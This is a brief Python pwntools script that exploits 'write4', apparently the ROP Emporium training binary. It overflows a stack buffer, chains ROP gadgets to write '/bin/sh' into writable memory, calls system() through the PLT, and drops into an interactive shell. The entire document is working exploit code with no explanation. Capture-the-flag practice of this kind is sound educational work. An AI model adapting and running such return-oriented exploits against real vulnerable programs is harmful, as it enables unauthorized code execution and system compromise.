#!/usr/bin/python 
from pwn import *

p = process("./write4")
elf = ELF("./write4")
libc = elf.libc 
mov_r14_r15 = 0x400820
pop_r14_r15 = 0x400890
p1ret = 0x400893
writable = 0x601090

pay = 'A'*(0x20+0x8)
pay += p64(pop_r14_r15) + p64(writable) + "/bin/sh\x00"
pay += p64(mov_r14_r15)
pay += p64(p1ret) + p64(writable) + p64(elf.plt['system'])

p.sendlineafter("> ", pay)

p.interactive()
